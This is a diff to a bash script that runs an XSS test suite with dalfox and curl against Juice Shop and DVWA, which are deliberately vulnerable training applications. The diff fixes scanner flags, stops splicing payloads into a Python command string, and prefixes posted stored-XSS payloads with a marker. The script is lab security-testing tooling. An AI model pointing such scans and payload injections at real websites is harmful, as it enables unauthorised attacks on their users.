@@ -7,19 +7,20 @@ set -euo pipefail
 
 TARGET="${1:?Usage: 02-xss.sh <TARGET_FQDN>}"
 BASE="${TARGET_PROTOCOL:-http}://${TARGET}"
+MARKER="${TGEN_FAMILY_MARKER:?Run through the declared native family journal adapter}"
 
 echo "[*] XSS suite against ${TARGET}"
 echo ""
 
 # --- dalfox automated tests ---
 echo "[+] Running dalfox against Juice Shop search..."
-dalfox url "${BASE}/juice-shop/rest/products/search?q=test" \
+dalfox url --url "${BASE}/juice-shop/rest/products/search?q=test" \
   --silence --no-color --timeout 10 ||
   echo "WARN: dalfox juice-shop scan returned non-zero"
 
 echo ""
 echo "[+] Running dalfox against DVWA XSS reflected..."
-dalfox url "${BASE}/dvwa/vulnerabilities/xss_r/?name=test" \
+dalfox url --url "${BASE}/dvwa/vulnerabilities/xss_r/?name=test" \
   --silence --no-color --timeout 10 ||
   echo "WARN: dalfox dvwa xss_r scan returned non-zero"
 
@@ -44,7 +45,7 @@ PAYLOADS=(
 )
 
 for payload in "${PAYLOADS[@]}"; do
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}'''))")
+  encoded=$(python3 -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "${payload}")
 
   echo "  Payload: ${payload}"
 
@@ -63,7 +64,7 @@ for payload in "${PAYLOADS[@]}"; do
   # DVWA XSS stored (POST)
   code=$(curl -sk -o /dev/null -w "%{http_code}" \
     -X POST "${BASE}/dvwa/vulnerabilities/xss_s/" \
-    -d "txtName=attacker&mtxMessage=${encoded}&btnSign=Sign+Guestbook" \
+    -d "txtName=attacker&mtxMessage=${MARKER}%3A${encoded}&btnSign=Sign+Guestbook" \
     --max-time 10) || code="ERR"
   echo "    dvwa/xss_s (POST)     -> HTTP ${code}"
 done
